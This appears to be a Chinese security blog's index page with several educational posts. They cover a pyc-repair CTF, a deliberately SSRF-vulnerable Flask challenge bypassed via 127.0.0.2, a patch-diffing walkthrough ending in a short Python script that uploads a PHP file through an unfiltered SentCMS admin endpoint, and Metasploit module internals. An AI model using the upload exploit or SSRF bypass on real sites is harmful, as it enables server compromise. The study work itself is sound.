<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>青鸟 Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="keywords" content="安全 编程">
<meta property="og:type" content="website">
<meta property="og:title" content="青鸟 Blog">
<meta property="og:url" content="http://blue-bird1.github.io/index.html">
<meta property="og:site_name" content="青鸟 Blog">
<meta property="og:locale" content="zh">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="青鸟 Blog">
  
    <link rel="alternate" href="/atom.xml" title="青鸟 Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <div class="outer">
        <div class="widget-wrap mobile-header">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="https://avatars3.githubusercontent.com/u/31133259?s=460&amp;v=4">
    <h2 class="author">bluebird</h2>
    <h3 class="description"></h3>
    <div class="count-box">
      <a href="/archives"><div><strong>7</strong><br>文章</div></a>
      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
      <a href="/tags"><div><strong>4</strong><br>标签</div></a>
    </div>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>主页</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>归档</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>分类</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>标签</li>
          </a>
        
    </ul>
  </div>
</div>

        <section id="main">
  
    <article id="post-newpost" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/06/05/newpost/" class="article-date">
  <time class="post-time" datetime="2018-06-04T16:51:34.000Z" itemprop="datePublished">
    <span class="post-month">6月</span><br/>
    <span class="post-day">05</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/06/05/newpost/">i春秋61挑战 wp</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>在i春秋 <a href="https://bbs.ichunqiu.com/thread-41125-1-1.html" target="_blank" rel="noopener">61挑战</a>出了道简单的签到题<br>题目是一个损坏的pyc文件</p>
<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>首先生成一个正常pyc文件  <code>python -m py_compile $filename</code> 对比如下<br><img src="/images/winhex_pyc.png" alt="winhex"></p>
<p>可以发现文件头被破坏 对照正常pyc文件修复. 然后使用工具对pyc进行反编译 比如 <a href="https://tool.lu/pyc/" target="_blank" rel="noopener">https://tool.lu/pyc/</a> </p>
<p>得到反编译代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_ = (lambda .0: continue[ chr(i ^ 51) for i in .0 ])((85, 95, 82, 84, 72, 67, 74, 80, 74, 86, 64, 91, 90, 67, 74, 78))</span><br></pre></td></tr></table></figure></p>
<p>打印 <code>_</code> 得到flag <code>flag{pycyeshipy}</code> </p>
<p>题目很简单 但是不知道为什么只有两位表哥做出来</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blue-bird1.github.io/2018/06/05/newpost/" data-id="cji113tqy0005r0nx1hqk7714" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/编程技术/">编程技术</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-一道简单题目" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/05/31/一道简单题目/" class="article-date">
  <time class="post-time" datetime="2018-05-31T15:06:36.000Z" itemprop="datePublished">
    <span class="post-month">5月</span><br/>
    <span class="post-day">31</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/05/31/一道简单题目/">一道简单题目</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>题目代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">from flask import Flask, request</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import socket</span><br><span class="line">from urllib.parse import urlparse</span><br><span class="line">from os.path import abspath，isfile</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;, methods=[&apos;POST&apos;, &apos;PUT&apos;])</span><br><span class="line">def main():</span><br><span class="line">    if request.method == &apos;POST&apos;:</span><br><span class="line">        return &apos;&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;   &lt;title&gt;405 Method Not Allowed&lt;/title&gt;  &apos; \</span><br><span class="line">               &apos;&lt;h1&gt;Method Not Allowed&lt;/h1&gt;  &lt;p&gt;The method is not allowed for the requested URL.&lt;/p&gt;  &lt;!-- /flag --&gt; &apos;</span><br><span class="line"></span><br><span class="line">    if request.method == &apos;PUT&apos;:</span><br><span class="line">        if not request.json:</span><br><span class="line">            return &apos;数据格式错误&apos;</span><br><span class="line"></span><br><span class="line">        data = request.data</span><br><span class="line">        j_data = json.loads(data)</span><br><span class="line"></span><br><span class="line">        try:</span><br><span class="line">            url = j_data[&apos;url&apos;]</span><br><span class="line">        except:</span><br><span class="line">                return &apos;缺少url字段&apos;</span><br><span class="line"></span><br><span class="line">        try:</span><br><span class="line">            filename = j_data[&apos;filename&apos;]</span><br><span class="line">        except:</span><br><span class="line">            return &apos;缺少filename字段&apos;</span><br><span class="line"></span><br><span class="line">        host = urlparse(url).hostname</span><br><span class="line">        ip_address = socket.getaddrinfo(host, &apos;http&apos;)[0][4][0]</span><br><span class="line">        if ip_address == &apos;127.0.0.1&apos;:</span><br><span class="line">            return &apos;url不能是127.0.0.1&apos;</span><br><span class="line"></span><br><span class="line">        ret = requests.get(url)</span><br><span class="line">        filename = abspath(filename)</span><br><span class="line">        if isfile(filename):</span><br><span class="line">            return  &apos;文件已存在&apos;</span><br><span class="line">        with open(filename) as f:</span><br><span class="line">            f.write(ret.text)</span><br><span class="line">        return &apos;文件已写入&apos;</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/flag&apos;)</span><br><span class="line">def flag():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    if ip != &apos;127.0.0.1&apos;:</span><br><span class="line">        return &apos;你的ip不是127.0.0.1&apos;</span><br><span class="line">    return &apos;flag&#123;ichunqiu51&#125;&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app.run(host=&apos;0.0.0.0&apos;)</span><br></pre></td></tr></table></figure></p>
<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>思路来源自p牛的博客 <a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html" target="_blank" rel="noopener">https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html</a></p>
<h3 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h3><p>主要考核了对ip协议的熟悉度 不止127.0.0.1  127.x这个段也是访问本机</p>
<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>直接访问<code>/</code> 发现状态码405</p>
<p>尝试<code>post</code>方法访问 返回界面也是405 但是状态码是200</p>
<p>查看网页源代码 发现注释 <code>/flag</code> 访问获得提示 <code>你的ip不是127.0.0.1</code></p>
<p>继续尝试 <code>put</code>方法访问<code>/</code> 得到提示 <code>数据格式错误</code><br>尝试json 根据提示构造出合适的格式  该功能是获取url地址文件并写入文件. flask默认可以直接读取的文件夹是 <code>/static/</code></p>
<p>尝试输入<code>127.0.0.1/flag</code> 发现被禁止 尝试绕过<code>127.0.0.2/flag</code>  得到flag</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blue-bird1.github.io/2018/05/31/一道简单题目/" data-id="cji113trd000ar0nx90ne99y2" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/编程技术/">编程技术</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-findbug" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/05/22/findbug/" class="article-date">
  <time class="post-time" datetime="2018-05-22T01:24:36.000Z" itemprop="datePublished">
    <span class="post-month">5月</span><br/>
    <span class="post-day">22</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/05/22/findbug/">寻找历史漏洞</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于著名cms 一旦爆出漏洞就算是xss 一天内都能看到漏洞分析文章和写好的利用代码。<br>但是如果我们渗透测试的时候遇到了不怎么著名的cms  发现是历史版本 但是不能搜索到exp或者分析文章。我们就需要自己去进行补丁比较来发现漏洞</p>
<h3 id="如何开始"><a href="#如何开始" class="headerlink" title="如何开始"></a>如何开始</h3><p>我们以<code>SentCMS</code>为例子 我们可以在码云下载到 <a href="https://gitee.com/sentcms/sentcms" target="_blank" rel="noopener">下载地址</a>  或者使用<br><code>git clone https://gitee.com/sentcms/sentcms</code><br>码云作为中国的github 自然是很方便。<br>但是如果不是通过git进行管理 也建议把下载的旧版本和老版本使用git进行管理<br>因为git的版本管理和提交对比非常实用 也方便保存进度</p>
<p>大致的git操作是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git init  #初始化git仓库</span><br><span class="line">git add * #将旧版本全部文件添加</span><br><span class="line">git commit  # 作为初始提交</span><br><span class="line"># 将新版本覆盖到旧版本的操作 可能是 mv -r ../new/  . 或者其他操作</span><br><span class="line"># git status 可能你会想要查看一下文件差异</span><br><span class="line">git add * # 将全部文件改变添加</span><br><span class="line">git commit # 提交更改</span><br><span class="line"># git log 查看日志</span><br><span class="line"># git diff  查看差异</span><br></pre></td></tr></table></figure></p>
<h3 id="找到漏洞版本"><a href="#找到漏洞版本" class="headerlink" title="找到漏洞版本"></a>找到漏洞版本</h3><p>一般来说你可以在版本更新日志里找到一些信息 很多cms都是有版本更新日志的 我们可以查看到修复了什么漏洞  但是这个cms没有发行版<br> 如果没有这种信息只能一个提交一个提交的去对比了<br> 可以使用web查看  <a href="https://gitee.com/sentcms/sentcms/commits/master" target="_blank" rel="noopener">地址</a></p>
<p>你也可以使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure></p>
<p>我们可以找到一条看起来可能是修复漏洞的提交<br><img src="https://box.kancloud.cn/2001e78808bd4d60f0b7355e78b09fbe_628x162.png" alt=""></p>
<h3 id="比较差异"><a href="#比较差异" class="headerlink" title="比较差异"></a>比较差异</h3><p>可以在命令行使用<code>git diff</code> 来查看 也可以选择直接在web界面查看每个提交 <a href="https://gitee.com/sentcms/sentcms/commits/master" target="_blank" rel="noopener">web提交地址</a></p>
<p>如果不是git 在linux可以使用<code>diff</code>命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff -r dir1 dir2</span><br></pre></td></tr></table></figure></p>
<p>也可以选择使用一些你喜欢的文件对比工具</p>
<h3 id="最重要的一步-查看代码"><a href="#最重要的一步-查看代码" class="headerlink" title="最重要的一步 查看代码"></a>最重要的一步 查看代码</h3><p>提交行数不多 快速查看 发现疑似漏洞点<br><img src="https://box.kancloud.cn/768d4ed85832725fdc7aea45e2699dfa_759x514.png" alt=""><br>可以看到对文件校验是这个提交才添加的 我们查看旧版本并下载 <a href="https://gitee.com/sentcms/sentcms/blob/341877cfb8672eed52fdc332650ee8b7ee297946/application/common/controller/Upload.php" target="_blank" rel="noopener">地址</a></p>
<p> 这个时候阅读一下readme 可以看到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">│ ├─common             COMMON公共模型，不可访问</span><br><span class="line">│ │ ├─controller      公共基类目录</span><br><span class="line">│ │ ├─model           模型目录</span><br><span class="line">│ │ ├─validate        验证配置</span><br><span class="line">│ │ ├─view            公共模板目录</span><br><span class="line">│ │ ├─widget          扩展组件目录</span><br></pre></td></tr></table></figure></p>
<p>很明显我们不能直接访问 需要通过调用<br>这个时候Ide就能帮助我们快速找到调用</p>
<p>我们在ide搜索可以找到<code>application/admin/controller/Upload.php</code> 没有进行任何过滤的调用了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">namespace app\admin\controller;</span><br><span class="line">use app\common\controller\Admin;</span><br><span class="line"></span><br><span class="line">class Upload extends Admin &#123;</span><br><span class="line"></span><br><span class="line">	public function _empty() &#123;</span><br><span class="line">		$controller = controller(&apos;common/Upload&apos;);</span><br><span class="line">		$action     = $this-&gt;request-&gt;action();</span><br><span class="line">		return $controller-&gt;$action();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><a href="https://gitee.com/sentcms/sentcms/blob/341877cfb8672eed52fdc332650ee8b7ee297946/application/admin/controller/Upload.php" target="_blank" rel="noopener">web地址</a></p>
<p>这个cms使用了tp5框架 需要通过路由访问<br>我们访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sentcms/admin/Upload/Upload</span><br></pre></td></tr></table></figure></p>
<p>从报错信息可以看到已经执行到了漏洞语句位置<br>由代码可知 直接上传文件即可</p>
<h3 id="python编写exp"><a href="#python编写exp" class="headerlink" title="python编写exp"></a>python编写exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &apos;http://127.0.0.1/sentcms/admin/Upload/Upload&apos;</span><br><span class="line">files = &#123;&apos;phpinfo.php&apos;: open(&apos;phpinfo.txt&apos;,&apos;rb&apos;)&#125;</span><br><span class="line"># 我本地cookeie</span><br><span class="line">cookie = &#123;&apos; remember_token&apos;:&apos;1|8b6075452c23faa1eba56fe61b89df391811d155e7578a40114732131c49d01341d8a7e30460891e6525292631bfa038a97e3d1d9f1290b345c60a6ac0ea1484&apos;,&apos;PHPSESSID&apos;:&apos;d4ubb72j0d9evlbktqqqct6ci2;&apos;&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url, files=file，cookies=cookie)</span><br></pre></td></tr></table></figure>
<p>我们可以在<code>uploads\picture\20180521</code>找到一个，以微秒时间的md5编码为文件名的php文件</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blue-bird1.github.io/2018/05/22/findbug/" data-id="cji113tqc0001r0nx9ngdd62a" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-metasploit-python-模块是如何运行" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/02/05/metasploit-python-模块是如何运行/" class="article-date">
  <time class="post-time" datetime="2018-02-05T01:33:23.000Z" itemprop="datePublished">
    <span class="post-month">2月</span><br/>
    <span class="post-day">05</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/02/05/metasploit-python-模块是如何运行/">metasploit python 模块是如何运行</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>metasploit的扩展实现的代码主要在<code>metasploit-framework/lib/msf/core/modules/external</code><br>目录结构如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">├── bridge.rb</span><br><span class="line">├── message.rb</span><br><span class="line">├── python</span><br><span class="line">│   ├── async_timeout</span><br><span class="line">│   │   ├── __init__.py</span><br><span class="line">│   └── metasploit</span><br><span class="line">│       ├── __init__.py</span><br><span class="line">│       ├── __init__.pyc</span><br><span class="line">│       ├── module.py</span><br><span class="line">│       ├── module.pyc</span><br><span class="line">│       ├── probe_scanner.py</span><br><span class="line">├── shim.rb</span><br><span class="line">└── templates</span><br><span class="line">    ├── capture_server.erb</span><br><span class="line">    ├── common_metadata.erb</span><br><span class="line">    ├── dos.erb</span><br><span class="line">    ├── multi_scanner.erb</span><br><span class="line">    └── remote_exploit_cmd_stager.erb</span><br></pre></td></tr></table></figure></p>
<p>其中<code>python</code>目录的py代码将会在我们运行python模块时加入python路径.这也是为什么我们能导入<code>metasploit</code><br><code>templates</code>目录则是用于实现将python代码变成模块的代码模板.事实上我们能使用msf对正常模块的功能 如<code>info</code>都是靠这些模板实现的.<br><code>message.rb</code>和<code>bridge</code>是与msf jsonrpc通信的一些api.<br><code>shim.rb</code>则是真正将python代码实现为模块的代码.</p>
<p>这里省略了不重要的细节的<code>message.rb</code>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">class Msf::Modules::External::Message</span><br><span class="line"> </span><br><span class="line">  def self.from_module(j)                                                                                        </span><br><span class="line">    if j[&apos;method&apos;]</span><br><span class="line">      m = self.new(j[&apos;method&apos;].to_sym)</span><br><span class="line">      m.params = j[&apos;params&apos;]</span><br><span class="line">      m</span><br><span class="line">    elsif j[&apos;response&apos;]</span><br><span class="line">      m = self.new(:reply)</span><br><span class="line">      m.params = j[&apos;response&apos;]</span><br><span class="line">      m.id = j[&apos;id&apos;]</span><br><span class="line">      m</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"> </span><br><span class="line">  def initialize(m)</span><br><span class="line">    self.method = m</span><br><span class="line">    self.params = &#123;&#125;</span><br><span class="line">    self.id = Base64.strict_encode64(SecureRandom.random_bytes(16))</span><br><span class="line">  end</span><br><span class="line"> </span><br><span class="line">  def to_json</span><br><span class="line">    params =</span><br><span class="line">      if self.params.respond_to? :to_nested_values</span><br><span class="line">        self.params.to_nested_values</span><br><span class="line">      else</span><br><span class="line">        self.params.to_h</span><br><span class="line">      end</span><br><span class="line">    JSON.generate(&#123;jsonrpc: &apos;2.0&apos;, id: self.id, method: self.method, params: params&#125;)</span><br><span class="line">  end</span><br></pre></td></tr></table></figure></p>
<p>这个类实际上是对传递给metasploit的信息的一个封装.<br><code>initialize</code>是ruby的初始化方法 从这里可以看到它有三个属性<code>method</code> <code>params</code> <code>id</code> </p>
<p><code>from_module</code>方法则是用于将传递的参数转换成自身<br><code>to_json</code>方法很明显就是转换成一个可用的json(jsonrpc传递需要json格式)</p>
<p>这里是省略了不重要的细节的<code>bridge.rb</code>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">require &apos;msf/core/modules/external/message&apos;</span><br><span class="line"></span><br><span class="line">class Msf::Modules::External::Bridge</span><br><span class="line">  </span><br><span class="line">  # 通过jsonrpc运行</span><br><span class="line">  def run(datastore)</span><br><span class="line">    unless self.running</span><br><span class="line">      m = Msf::Modules::External::Message.new(:run)</span><br><span class="line">      m.params = datastore.dup</span><br><span class="line">      send(m)</span><br><span class="line">      self.running = true</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line">	</span><br><span class="line">  # 获取当前状态和恢复run状态  </span><br><span class="line">  def get_status</span><br><span class="line">    if self.running || !self.messages.empty?</span><br><span class="line">      m = receive_notification</span><br><span class="line">      if m.nil?</span><br><span class="line">        close_ios</span><br><span class="line">        self.messages.close</span><br><span class="line">        self.running = false</span><br><span class="line">      end</span><br><span class="line"></span><br><span class="line">      return m</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line">  </span><br><span class="line">  # 接收</span><br><span class="line">  def recv(filter_id=nil, timeout=600)</span><br><span class="line">    _, out, err = self.ios</span><br><span class="line">    message = &apos;&apos;</span><br><span class="line">  </span><br><span class="line">  # jsonrpc发送和接受</span><br><span class="line">  def send_receive(message)</span><br><span class="line">    send(message)</span><br><span class="line">    recv(message.id)</span><br><span class="line">  end</span><br><span class="line">  </span><br><span class="line">  # 发送模块元数据</span><br><span class="line">  def describe</span><br><span class="line">    resp = send_receive(Msf::Modules::External::Message.new(:describe))</span><br><span class="line">    close_ios</span><br><span class="line">    resp.params</span><br><span class="line">  end</span><br><span class="line">  	</span><br><span class="line">  # 发送  </span><br><span class="line">  def send(message)</span><br><span class="line">    input, output, err, status = ::Open3.popen3(self.env, self.cmd)</span><br><span class="line">    self.ios = [input, output, err]</span><br><span class="line">    self.wait_thread = status</span><br><span class="line">    case select(nil, [input], nil, 0.1)</span><br><span class="line">    when nil</span><br><span class="line">      raise &quot;Cannot run module #&#123;self.path&#125;&quot;</span><br><span class="line">    when [[], [input], []]</span><br><span class="line">      m = message.to_json</span><br><span class="line">      write_message(input, m)</span><br><span class="line">    else</span><br><span class="line">      raise &quot;Error running module #&#123;self.path&#125;&quot;</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line">  </span><br><span class="line">  # TODO 这里原本有一大段关于网络接受的代码 </span><br><span class="line"></span><br><span class="line"># 每个编程语言扩展的具体实现</span><br><span class="line">class Msf::Modules::External::PyBridge &lt; Msf::Modules::External::Bridge</span><br><span class="line"> # 判断是否是py文件</span><br><span class="line">  def self.applies?(module_name)</span><br><span class="line">    module_name.match? /\.py$/</span><br><span class="line">  end</span><br><span class="line"> </span><br><span class="line">  # 初始化 python扩展添加了额外的路径</span><br><span class="line">  def initialize(module_path)</span><br><span class="line">    super</span><br><span class="line">    pythonpath = ENV[&apos;PYTHONPATH&apos;] || &apos;&apos;</span><br><span class="line">    self.env = self.env.merge(&#123; &apos;PYTHONPATH&apos; =&gt; pythonpath + File::PATH_SEPARATOR + File.expand_path(&apos;../python&apos;, __FILE__) &#125;)</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Msf::Modules::External::Bridge</span><br><span class="line">  # 载入列表 我们可以期待更多的语言可以编写msf模块 如Msf::Modules::External::JsBridge?</span><br><span class="line">  LOADERS = [</span><br><span class="line">    Msf::Modules::External::PyBridge,</span><br><span class="line">    Msf::Modules::External::Bridge</span><br><span class="line">  ]</span><br><span class="line">	</span><br><span class="line">  # 运行模块方法 让载入的bridge都判断是否是自己所属的 </span><br><span class="line">  def self.open(module_path)</span><br><span class="line">    LOADERS.each do |klass|</span><br><span class="line">      return klass.new module_path if klass.applies? module_path</span><br><span class="line">    end</span><br><span class="line">    nil</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure></p>
<p>这里是省略了不重要的细节的<code>shim.rb</code>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 